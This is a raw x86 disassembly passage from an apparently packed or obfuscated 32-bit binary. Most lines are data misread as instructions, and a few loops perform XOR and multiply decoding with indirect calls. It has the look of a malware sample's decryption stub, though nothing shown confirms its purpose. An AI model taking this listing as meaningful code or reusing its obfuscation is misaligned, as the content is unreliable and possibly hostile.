  4083a4:	jbe    0x408349
  4083a6:	jns    0x40837d
  4083a8:	lods   eax,DWORD PTR ds:[esi]
  4083a9:	xor    al,0x7b
  4083ab:	inc    esp
  4083ac:	mov    fs:0x688c24b,eax
  4083b2:	push   es
  4083b3:	mov    esp,0x3fe4bfc7
  4083b8:	(bad)  
  4083b9:	gs jae 0x408350
  4083bc:	inc    eax
  4083bd:	shr    edi,1
  4083bf:	stc    
  4083c0:	adc    DWORD PTR [edi-0x17],0x2e2eae3c
  4083c7:	sar    DWORD PTR [ebx+0x17],cl
  4083ca:	int3   
  4083cb:	inc    ecx
  4083cc:	dec    edx
  4083cd:	xor    dh,dl
  4083cf:	shr    BYTE PTR ds:0x692e1f12,0xdb
  4083d6:	inc    ebx
  4083d7:	data16 int 0x2
  4083da:	xlat   BYTE PTR ds:[ebx]
  4083db:	mov    cl,0x46
  4083dd:	imul   esp,eax,0xe9d1b2cb
  4083e3:	retf   0x5dcb
  4083e6:	loopne 0x40842c
  4083e8:	sbb    eax,0xa23520cc
  4083ed:	cmp    dh,BYTE PTR [ebp+0x3007ed9f]
  4083f3:	out    0xdf,al
  4083f5:	iret   
  4083f6:	out    dx,eax
  4083f7:	dec    esp
  4083f8:	add    cl,ch
  4083fa:	add    DWORD PTR [edi-0xb],ecx
  4083fd:	and    eax,0x765c9588
  408402:	retf   
  408403:	dec    edi
  408404:	mov    eax,0x92bf542e
  408409:	rcr    BYTE PTR [edi+edi*2+0x7f],cl
  40840d:	sub    cl,BYTE PTR [edi+0x46769635]
  408413:	push   cs
  408414:	fdivr  QWORD PTR es:[edi-0x6fb1f219]
  40841b:	aaa    
  40841c:	xchg   ecx,eax
  40841d:	sub    DWORD PTR [esi+0x79f19c36],esp
  408423:	rcl    DWORD PTR [ecx+ebp*4],1
  408426:	test   al,0x26
  408428:	loope  0x40848b
  40842a:	popa   
  40842b:	and    DWORD PTR [esi],edx
  40842d:	loop   0x4083e5
  40842f:	fdiv   QWORD PTR [ecx+0x262a2066]
  408435:	xchg   ecx,eax
  408436:	and    BYTE PTR ds:0x317b2b0,ch
  40843c:	or     al,0x98
  40843e:	pop    edx
  40843f:	inc    edi
  408440:	imul   ebx,DWORD PTR [edx],0x768b781d
  408446:	gs xor al,0x8f
  40844a:	push   esp
  40844b:	sbb    BYTE PTR [eax+edi*1],al
  40844e:	fcom   QWORD PTR [ebx+0x7802b9b4]
  408454:	dec    esi
  408455:	setno  dh
  408458:	stc    
  408459:	add    bh,ch
  40845b:	loope  0x4084bd
  40845d:	dec    esi
  40845e:	pop    eax
  40845f:	mov    BYTE PTR [ebx+ebx*2],ch
  408462:	in     al,dx
  408463:	inc    ebx
  408464:	push   cs
  408465:	pop    ecx
  408466:	ds sti 
  408468:	aas    
  408469:	jnp    0x40844b
  40846b:	mov    eax,0x4bf548e2
  408470:	ss popa 
  408472:	in     al,dx
  408473:	shl    cl,1
  408475:	stos   BYTE PTR es:[edi],al
  408476:	jl     0x4084a0
  408478:	dec    esp
  408479:	stos   DWORD PTR es:[edi],eax
  40847a:	fisttp QWORD PTR [edi+0x5f]
  40847d:	pop    edx
  40847e:	imul   ecx,esp,0x66fe4d0b
  408484:	jae    0x4084ee
  408486:	std    
  408487:	fcomp  DWORD PTR [ebx+0x12520b3b]
  40848d:	stc    
  40848e:	pop    ebp
  40848f:	js     0x40842d
  408491:	jno    0x40850b
  408493:	or     ecx,ecx
  408495:	sbb    edi,DWORD PTR [ecx-0x365bf55e]
  40849b:	sbb    eax,0x1a1f1f13
  4084a0:	adc    bl,BYTE PTR [edi]
  4084a2:	adc    BYTE PTR [ecx+0x2bf50af0],dh
  4084a8:	xchg   ecx,eax
  4084a9:	retf   0x4943
  4084ac:	push   eax
  4084ad:	jae    0x408527
  4084af:	fdivr  QWORD PTR [ecx-0x15eb7b92]
  4084b5:	push   cs
  4084b6:	scas   eax,DWORD PTR es:[edi]
  4084b7:	(bad)  
  4084b8:	mov    ah,0x88
  4084ba:	add    bh,BYTE PTR [edx+0x646573bf]
  4084c0:	and    DWORD PTR [ebx-0x5b],edi
  4084c3:	push   ebp
  4084c4:	ds push es
  4084c6:	nop
  4084c7:	data16 test BYTE PTR [ebx+0x9b1a8cc],bl
  4084ce:	pop    esp
  4084cf:	out    dx,eax
  4084d0:	push   0x9cb23906
  4084d5:	(bad)  
  4084d7:	jmp    0x891f:0x48301479
  4084de:	and    esi,0x2023b7ab
  4084e4:	rcr    cl,0xda
  4084e7:	jg     0x408542
  4084e9:	ins    DWORD PTR es:[edi],dx
  4084ea:	xchg   ebx,eax
  4084eb:	retf   
  4084ec:	ret    0xc411
  4084ef:	dec    eax
  4084f0:	mov    esi,0x840f5e60
  4084f5:	dec    esi
  4084f6:	or     DWORD PTR [eax],eax
  4084f8:	add    bh,dh
  4084fa:	fcmovb st,st(7)
  4084fc:	inc    ebp
  4084fd:	hlt    
  4084fe:	(bad)  
  4084ff:	std    
  408500:	add    eax,0xf4458d07
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	dec    ebx
  4085de:	icebp  
  4085df:	jns    0x408566
  4085e1:	in     al,dx
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	adc    edi,edx
  4085eb:	xlat   BYTE PTR ds:[ebx]
  4085ec:	rdpmc  
  4085ee:	arpl   WORD PTR [ebp-0x5715d52d],bx
  4085f4:	jb     0x408614
  4085f6:	xor    eax,0x16adcae4
  4085fb:	sub    BYTE PTR [edx],0x46
  4085fe:	call   FWORD PTR [esi]
  408600:	add    eax,0xa9b0c54e
  408605:	jp     0x408621
  408607:	inc    esp
  408608:	or     BYTE PTR [ebp-0x75ae66e2],dh
  40860e:	or     al,0x79
  408610:	xadd   bh,ah
  408613:	cdq    
  408614:	fwait
  408615:	push   ecx
  408616:	or     dl,dh
  408618:	outs   dx,DWORD PTR ds:[esi]
  408619:	sub    DWORD PTR [edx],eax
  40861b:	mov    dl,0x68
  40861d:	icebp  
  40861e:	and    BYTE PTR [eax],cl
  408620:	std    
  408621:	and    DWORD PTR [ecx-0x4c35d751],0x73
  408628:	ret    0xd455
  40862b:	xor    DWORD PTR [edi-0x9],esi
  40862e:	pop    ss
  40862f:	jecxz  0x408689
  408631:	dec    edi
  408632:	or     BYTE PTR [edi+esi*8-0x26790af3],cl
  408639:	aad    0x8f
  40863b:	pop    ebx
  40863c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40863d:	rep stos DWORD PTR es:[edi],eax
  40863f:	mov    esp,0x4ada63b5
  408644:	add    eax,0xfc4400aa
  408649:	sti    
  40864a:	jecxz  0x4085fb
  40864c:	bound  ebp,QWORD PTR [ebp+0x5a195e8a]
  408652:	hlt    
  408653:	retf   
  408654:	mov    ecx,0xa022f203
  408659:	pop    edx
  40865a:	dec    ebx
  40865b:	adc    DWORD PTR [ebp-0x47],edi
  40865e:	sub    esp,0xf6bfdf2a
  408664:	pop    es
  408665:	aaa    
  408666:	dec    ebp
  408667:	xchg   BYTE PTR [ecx+0x34fc7e98],ch
  40866d:	stos   BYTE PTR es:[edi],al
  40866e:	ds (bad) 
  408670:	lock icebp 
  408672:	test   eax,0x207ec5be
  408677:	sahf   
  408678:	(bad)  
  408679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40867a:	ins    BYTE PTR es:[edi],dx
  40867b:	dec    edx
  40867c:	jmp    0x71bf9b78
  408681:	imul   ebp,DWORD PTR [ebx],0xffffffc1
  408684:	inc    edi
  408685:	fstp   QWORD PTR es:[ebx-0x1]
  408689:	xor    eax,0x443c5d66
  40868e:	ret    0xc461
  408691:	mov    WORD PTR [eax+0x9],es
  408694:	mov    ds:0xa83c31f0,al
  408699:	push   0xf
  40869b:	jnp    0x4086f5
  40869d:	pop    ebx
  40869e:	add    DWORD PTR [edx-0x20],eax
  4086a1:	add    ch,BYTE PTR [edi+0x19]
  4086a4:	jmp    0x8bff89bc
  4086a9:	dec    edi
  4086aa:	mov    cl,BYTE PTR [edi]
  4086ac:	leave  
  4086ad:	aas    
  4086ae:	lahf   
  4086af:	mov    dl,0xca
  4086b1:	cmp    BYTE PTR [ebx-0x1],0x23
  4086b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b6:	int3   
  4086b7:	shl    DWORD PTR [edx+ecx*1-0x70e685ec],0xcf
  4086bf:	jecxz  0x408688
  4086c1:	iret   
  4086c2:	jle    0x408689
  4086c4:	pop    ebx
  4086c5:	mov    esp,0xf33874e4
  4086ca:	xor    ebx,0x2cd12726
  4086d0:	out    0xbd,eax
  4086d2:	push   ds
  4086d3:	cmp    BYTE PTR [edx],al
  4086d5:	jne    0x408659
  4086d7:	or     eax,DWORD PTR [ebx]
  4086d9:	xor    DWORD PTR [eax-0x423afa9],edi
  4086df:	sub    BYTE PTR [eax],ch
  4086e1:	adc    ebx,eax
  4086e3:	adc    ebx,DWORD PTR [ebx-0x64a8fa2e]
  4086e9:	xchg   esp,eax
  4086ea:	and    bl,BYTE PTR [ebp+0x788fdd92]
  4086f0:	sbb    al,0xc3
  4086f2:	or     al,0x3f
  4086f4:	mov    bl,0xff
  4086f6:	mov    bh,0x74
  4086f8:	and    eax,0x93b79c7c
  4086fd:	icebp  
  4086fe:	sub    edx,DWORD PTR [edx-0x66ed6f27]
  408704:	popf   
  408705:	pop    es
  408706:	ins    BYTE PTR es:[edi],dx
  408707:	iret   
  408708:	inc    edi
  408709:	xchg   edi,eax
  40870a:	mov    ds:0x66260e96,eax
  40870f:	repz imul esi,DWORD PTR [ebx-0x4a],0x248f719b
  408717:	push   0x8ff1b933
  40871c:	jbe    0x408770
  40871e:	jns    0x40879f
  408720:	fisttp QWORD PTR [edx]
  408722:	icebp  
  408723:	lods   al,BYTE PTR ds:[esi]
  408724:	jl     0x408740
  408726:	fwait
  408727:	jne    0x4086dd
  408729:	and    al,0xdb
  40872b:	mov    eax,0xe40d7050
  408730:	(bad)  
  408731:	mov    al,0x6d
  408733:	ins    BYTE PTR es:[edi],dx
  408734:	and    cl,0x14
  408737:	mov    edi,0x87b28535
  40873c:	and    al,dh
  40873e:	test   dh,dl
  408740:	aam    0xe1
  408742:	montmul (bad)
  408743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408744:	push   es
  408745:	gs fxch st(4)
  408748:	add    BYTE PTR [ecx*8+0x2e5929f8],dl
  40874f:	in     eax,0x70
  408751:	ret    
  408752:	cmp    eax,0x33f8458b
  408757:	rol    DWORD PTR [ebx],0xc6
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [edi+0x522c5073],bh
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	imul   ebp,DWORD PTR [ecx+0x7b8bd445],0xf2894eaf
  408781:	and    dh,BYTE PTR [ecx+ebp*4-0x37]
  408785:	es iret 
  408787:	mov    cl,0x31
  408789:	call   0x73fc:0xa4c826b2
  408790:	loope  0x4087ac
  408792:	mov    eax,ds:0x2b1c9d22
  408797:	icebp  
  408798:	cmp    al,0xf3
  40879a:	adc    al,0x84
  40879c:	js     0x408759
  40879e:	scas   al,BYTE PTR es:[edi]
  40879f:	fistp  WORD PTR [edx]
  4087a1:	xor    DWORD PTR [edx+0x64],ebp
  4087a4:	dec    edx
  4087a5:	das    
  4087a6:	adc    al,cl
  4087a8:	xor    eax,0x7960b842
  4087ad:	xor    eax,0x3534a5fe
  4087b2:	sar    BYTE PTR [edi-0xef0b93c],1
  4087b8:	xor    DWORD PTR [edi+0x4e],esp
  4087bb:	arpl   WORD PTR [edi],di
  4087bd:	iret   
  4087be:	dec    edi
  4087bf:	in     eax,0x13
  4087c1:	ins    DWORD PTR es:[edi],dx
  4087c2:	clc    
  4087c3:	cmp    ah,BYTE PTR [edi]
  4087c5:	xchg   ecx,eax
  4087c6:	or     DWORD PTR [ecx+esi*4],eax
  4087c9:	mov    esp,0xcf0faa62
  4087ce:	add    DWORD PTR [edi-0x12],esp
  4087d1:	mov    edi,0xd5889e46
  4087d6:	test   al,0x8b
  4087d8:	mov    ebp,fs
  4087da:	fiadd  WORD PTR [eax+0x7d]
  4087dd:	pop    ecx
  4087de:	pop    ecx
  4087df:	(bad)
  4087e3:	add    esi,DWORD PTR [edx]
  4087e5:	push   eax
  4087e6:	fdivr  st(7),st
  4087e8:	sub    DWORD PTR [eax+ebp*2+0x73],edi
  4087ec:	cmp    esi,DWORD PTR [eax]
  4087ee:	out    dx,eax
  4087ef:	xchg   esp,eax
  4087f0:	pop    ebx
  4087f1:	push   ecx
  4087f2:	aas    
  4087f3:	cli    
  4087f4:	xor    BYTE PTR [edx+0x44405451],dl
  4087fa:	jae    0x4087c0
  4087fc:	in     eax,dx
  4087fd:	xor    eax,0x59c2e43
  408802:	(bad)  
  408803:	ror    BYTE PTR [ecx+0x6992cdc1],1
  408809:	push   ds
  40880a:	fwait
  40880b:	das    
  40880c:	ins    BYTE PTR es:[edi],dx
  40880d:	pop    ebx
  40880e:	test   eax,0x61aa6321
  408814:	jl     0x4087b7
  408816:	add    al,0x7a
  408818:	lds    ebx,FWORD PTR [edx-0x42bdda27]
  40881e:	fimul  WORD PTR [edi]
  408820:	int3   
  408821:	lds    ebx,FWORD PTR gs:[ebp+0x5d3ac187]
  408828:	cwde   
  408829:	sbb    DWORD PTR [eax+0x5d],ebx
  40882c:	ret    
  40882d:	je     0x408864
  40882f:	lea    esp,[ebx+0x1e]
  408832:	loop   0x4087d8
  408834:	xor    al,0x4c
  408836:	sbb    cl,BYTE PTR [ecx]
  408838:	pop    ss
  408839:	inc    edi
  40883a:	push   ecx
  40883b:	fs pop ecx
  40883d:	fmul   QWORD PTR [ecx]
  40883f:	pop    esp
  408840:	jne    0x408800
  408842:	in     al,0xbc
  408844:	pushf  
  408845:	and    eax,DWORD PTR [ebx-0x63]
  408848:	add    BYTE PTR [ebp-0x235c2416],ch
  40884e:	ret    
  40884f:	std    
  408850:	pop    ebp
  408851:	fidiv  DWORD PTR [ecx-0x4e9af50d]
  408857:	lods   al,BYTE PTR ds:[esi]
  408858:	xor    bl,BYTE PTR fs:[edi+0x38]
  40885c:	lods   eax,DWORD PTR ds:[esi]
  40885d:	enter  0xec37,0x31
  408861:	stc    
  408862:	loope  0x408849
  408864:	lds    edi,FWORD PTR [ebp-0x11]
  408867:	fst    DWORD PTR [edi]
  408869:	mov    ds:0x307f09ed,eax
  40886e:	clc    
  40886f:	inc    ebp
  408870:	loopne 0x408867
  408872:	mov    eax,0xfdec7256
  408877:	dec    ecx
  408878:	dec    esi
  408879:	xor    ecx,DWORD PTR [esi-0x788a42c2]
  40887f:	and    DWORD PTR [esi-0x4bbe9bad],esi
  408885:	push   ds
  408886:	outs   dx,BYTE PTR ds:[esi]
  408887:	fistp  QWORD PTR fs:[eax-0x5]
  40888b:	int    0xa
  40888d:	sbb    eax,0xdc964404
  408892:	jle    0x408871
  408894:	xor    al,0x6a
  408896:	stc    
  408897:	aaa    
  408898:	hlt    
  408899:	psrad  mm2,QWORD PTR [eax-0x15bd09a3]
  4088a0:	rcr    BYTE PTR [ecx],cl
  4088a2:	sub    edx,DWORD PTR [ebx]
  4088a4:	or     eax,0x74537738
  4088a9:	jge    0x40891e
  4088ab:	loop   0x40887c
  4088ad:	inc    eax
  4088ae:	xchg   bl,ah
  4088b0:	int3   
  4088b1:	jb     0x408885
  4088b3:	mov    BYTE PTR [edx+0x63],al
  4088b6:	jo     0x408889
  4088b8:	iret   
  4088b9:	mov    ebp,0x6403494
  4088be:	jo     0x408914
  4088c0:	out    dx,al
  4088c1:	xchg   edx,eax
  4088c2:	push   cs
  4088c3:	nop
  4088c4:	xchg   ebx,eax
  4088c5:	or     DWORD PTR ds:0xc3225511,edx
  4088cb:	fnsave [edx]
  4088cd:	cli    
  4088ce:	push   ecx
  4088cf:	or     al,0x3e
  4088d1:	pop    edx
  4088d2:	xor    DWORD PTR [ebp+edx*4-0x41],ebx
  4088d6:	pop    ss
  4088d7:	mov    cl,0xc2
  4088d9:	fs loopne 0x408871
  4088dc:	shr    BYTE PTR [edi],0xcd
  4088df:	mov    ch,0x71
  4088e1:	pop    edi
  4088e2:	pop    esi
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xe147681a
  40893f:	shl    DWORD PTR [esi+0x38],1
  408942:	sar    DWORD PTR [esi+0x7e],1
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	mov    al,ds:0x5a0190a8
  40894e:	jl     0x4088ea
  408950:	xchg   ebp,eax
  408951:	(bad)  
  408952:	mov    ch,0xdd
  408954:	pop    ds
  408955:	cmp    BYTE PTR [ebp+0x666601d3],dh
  40895b:	inc    BYTE PTR [ecx-0x63]
  40895e:	mov    ebx,0x2073135d
  408963:	call   0xef3738be
  408968:	popf   
  408969:	cmp    dl,0x10
  40896c:	and    al,0x81
  40896e:	addr16 pop ecx
  408970:	jp     0x40893c
  408972:	scas   eax,DWORD PTR es:[edi]
  408973:	mov    edi,DWORD PTR [ecx+0x38]
  408976:	add    ebx,edx
  408978:	(bad)  
  408979:	xchg   esp,eax
  40897a:	cmp    BYTE PTR [eax],ch
  40897c:	adc    dl,ch
  40897e:	in     al,dx
  40897f:	ja     0x408944
  408981:	jo     0x408958
  408983:	js     0x4089cb
  408985:	and    edx,DWORD PTR [edx-0x10]
  408988:	les    edx,FWORD PTR [ecx+0x4eeb1162]
  40898e:	loop   0x408918
  408990:	mov    cl,0xb9
  408992:	call   0xc4e:0xa93eb6b4
  408999:	sbb    ch,cl
  40899b:	xchg   edx,eax
  40899c:	std    
  40899d:	je     0x408958
  40899f:	add    dl,al
  4089a1:	aam    0xaa
  4089a3:	retf   
  4089a4:	xchg   edx,eax
  4089a5:	add    al,0xd2
  4089a7:	mov    ds:0xef396761,eax
  4089ac:	or     edx,0x2492a2ff
  4089b2:	jno    0x408957
  4089b4:	push   0xb2dfed9
  4089b9:	pop    ebp
  4089ba:	xchg   edx,eax
  4089bb:	inc    eax
  4089bc:	lods   eax,DWORD PTR ds:[esi]
  4089bd:	xchg   edx,eax
  4089be:	jns    0x40898b
  4089c0:	xor    ebx,DWORD PTR [edx-0x1018c4d0]
  4089c6:	xor    bl,BYTE PTR [edx-0xb7d3997]
  4089cc:	retf   
  4089cd:	idiv   BYTE PTR [edi-0x58]
  4089d0:	jg     0x408a01
  4089d2:	jmp    0x2b58:0x2442e316
  4089d9:	sbb    DWORD PTR [ebp+0x6a],esi
  4089dc:	sub    dh,dh
  4089de:	push   ebx
  4089df:	cmp    al,0xea
  4089e1:	xchg   DWORD PTR [esi+ecx*8-0x3dc79291],esi
  4089e8:	test   DWORD PTR [edi-0x44],ebp
  4089eb:	ds je  0x4089fb
  4089ee:	loopne 0x408a5b
  4089f0:	dec    edx
  4089f1:	dec    eax
  4089f2:	or     eax,0x6a0167e1
  4089f7:	mov    ch,0x33
  4089f9:	in     eax,0x8b
  4089fb:	clc    
  4089fc:	adc    BYTE PTR [ebx+0x4],ah
  4089ff:	xor    dh,BYTE PTR [ebp-0x7dae150e]
  408a05:	jne    0x4089e4
  408a07:	repnz ficom DWORD PTR [ecx-0x53]
  408a0b:	sti    
  408a0c:	fnstcw WORD PTR [ebx+0x51a38e2f]
  408a12:	ds and eax,0x82f19b67
  408a18:	and    esp,ebp
  408a1a:	jae    0x4089c5
  408a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a1d:	xchg   ebp,eax
  408a1e:	mov    DWORD PTR [edx+ebp*8+0x1f],esp
  408a22:	ret    0x991b
  408a25:	aad    0x5a
  408a27:	or     eax,0x46c19389
  408a2c:	enter  0x25fc,0x5a
  408a30:	xor    al,0x49
  408a32:	cmp    ah,bh
  408a34:	add    al,0x2
  408a36:	(bad)  
  408a37:	aam    0xef
  408a39:	push   esp
  408a3a:	call   0xa02e:0xfb3e0e77
  408a41:	mov    ebx,0xe0d7bdd8
  408a46:	inc    ecx
  408a47:	add    cl,BYTE PTR [ebx]
  408a49:	mov    ch,0x32
  408a4b:	mov    al,ds:0xa369f001
  408a50:	adc    eax,0xa2ca4af
  408a55:	push   cs
  408a56:	push   ebp
  408a57:	outs   dx,BYTE PTR ds:[esi]
  408a58:	lea    edi,ds:0xc2ae1203
  408a5e:	test   DWORD PTR [eax],0xc1bae75
  408a64:	mov    bh,0xfc
  408a66:	push   0x17f88f7d
  408a6b:	xor    BYTE PTR [ebp+0x1c87adf0],ah
  408a71:	fdivr  DWORD PTR ds:0xc7a8a4f7
  408a77:	jge    0x408a69
  408a79:	or     BYTE PTR gs:[ecx],dl
  408a7c:	and    al,0x66
  408a7e:	push   0x39
  408a80:	dec    ebx
  408a81:	jbe    0x408a27
  408a83:	outs   dx,DWORD PTR ds:[esi]
  408a84:	popa   
  408a85:	outs   dx,BYTE PTR ds:[esi]
  408a86:	ret    
  408a87:	loop   0x408ac5
  408a89:	push   eax
  408a8a:	loop   0x408a3b
  408a8c:	cmp    dh,BYTE PTR [edi+esi*8]
  408a8f:	bound  eax,QWORD PTR [edx]
  408a91:	es pushf 
  408a93:	jnp    0x408aec
  408a95:	mov    cl,0x24
  408a97:	pop    edx
  408a98:	xchg   esp,eax
  408a99:	and    ah,ah
  408a9b:	punpckldq mm3,mm3
  408a9e:	fiadd  DWORD PTR [ebx]
  408aa0:	sub    al,0x8
  408aa2:	into   
  408aa3:	fiadd  DWORD PTR [eax+0x5e]
  408aa6:	push   0x5d9dc5c3
  408aab:	mov    WORD PTR [eax+0x2a],es
  408aae:	mov    bl,0x63
  408ab0:	pop    ebp
  408ab1:	push   eax
  408ab2:	loop   0x408a3f
  408ab4:	jge    0x408abe
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	dec    esi
  408b1b:	mov    bh,0x8b
  408b1d:	cmc    
  408b1e:	scas   al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	ret    
  408b27:	stos   BYTE PTR es:[edi],al
  408b28:	mov    WORD PTR [eax],gs
  408b2a:	mov    eax,0xe863898c
  408b2f:	xor    dh,BYTE PTR [edx]
  408b31:	xor    BYTE PTR [edi-0xd],0x96
  408b35:	loope  0x408ba5
  408b37:	pcmpgtw mm0,QWORD PTR [esi+0x3c132f13]
  408b3e:	aaa    
  408b3f:	cli    
  408b40:	pop    ss
  408b41:	ficomp WORD PTR [esi]
  408b43:	mov    al,ds:0x12241f3e
  408b48:	pop    eax
  408b49:	mov    esp,0x8e899ed4
  408b4e:	sub    eax,0xe8e4329b
  408b53:	inc    eax
  408b54:	sbb    al,0xbb
  408b56:	push   ebx
  408b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b58:	mov    ebx,0xb8dc9f8e
  408b5d:	(bad)  
  408b5e:	fldenv [ebp+0x44]
  408b61:	add    DWORD PTR [edi-0x17],esi
  408b64:	jecxz  0x408aec
  408b66:	fcmovbe st,st(2)
  408b68:	push   ebp
  408b69:	mov    al,ds:0xe2479e2c
  408b6e:	xchg   ecx,eax
  408b6f:	std    
  408b70:	test   al,0x96
  408b72:	sbb    eax,DWORD PTR [ebx+0x7c92c38a]
  408b78:	inc    edi
  408b79:	inc    eax
  408b7a:	add    DWORD PTR [ebx],esi
  408b7c:	retf   0x65e4
  408b7f:	add    edx,DWORD PTR [esp+edi*1]
  408b82:	or     BYTE PTR [eax],bh
  408b84:	dec    esp
  408b85:	add    esp,DWORD PTR [ebx-0x12e5ec3e]
  408b8b:	or     BYTE PTR [ecx-0x2b06c893],ch
  408b91:	sbb    esp,esp
  408b93:	stc    
  408b94:	fsubr  QWORD PTR [eax-0x1d]
  408b97:	fnsave [edi]
  408b99:	xor    BYTE PTR ds:0xb67b9896,al
  408b9f:	mov    al,ds:0xbfa8ea46
  408ba4:	iret   
  408ba5:	stos   BYTE PTR es:[edi],al
  408ba6:	shl    BYTE PTR [esp+esi*1],0x5a
  408baa:	loop   0x408b90
  408bac:	cmp    al,0x2b
  408bae:	cmp    ebp,edi
  408bb0:	lahf   
  408bb1:	test   eax,0xa9d2d011
  408bb6:	cmp    esi,edi
  408bb8:	retf   0x825b
  408bbb:	xchg   esp,eax
  408bbc:	int    0xc7
  408bbe:	mov    ch,0x43
  408bc0:	aam    0x33
  408bc2:	xor    al,0x2c
  408bc4:	ret    0x9903
  408bc7:	sbb    eax,0xe5a56522
  408bcc:	mov    eax,ds:0x753f016e
  408bd1:	xchg   edx,eax
  408bd2:	mov    ss,WORD PTR [esi-0x24]
  408bd5:	pop    esi
  408bd6:	mov    ecx,0xe2e5577a
  408bdb:	mov    eax,ds:0x98e0504d
  408be0:	adc    BYTE PTR [esi+0x275f13cd],dl
  408be6:	lds    ebx,FWORD PTR [eax+0x1b]
  408be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bea:	stos   BYTE PTR es:[edi],al
  408beb:	mov    DWORD PTR [esi+0x21],ecx
  408bee:	push   esp
  408bef:	scas   al,BYTE PTR es:[edi]
  408bf0:	outs   dx,BYTE PTR ds:[esi]
  408bf1:	xchg   DWORD PTR ds:0x9c1c7c48,ecx
  408bf7:	inc    ebx
  408bf8:	mov    ebp,0x7bb56d88
  408bfd:	jge    0x408c28
  408bff:	xchg   DWORD PTR [ecx],edx
  408c01:	jmp    0x5fa:0x216fae33
  408c08:	fs push ecx
  408c0a:	cmp    al,0xd
  408c0c:	xor    al,0x59
  408c0e:	jmp    0x408ba6
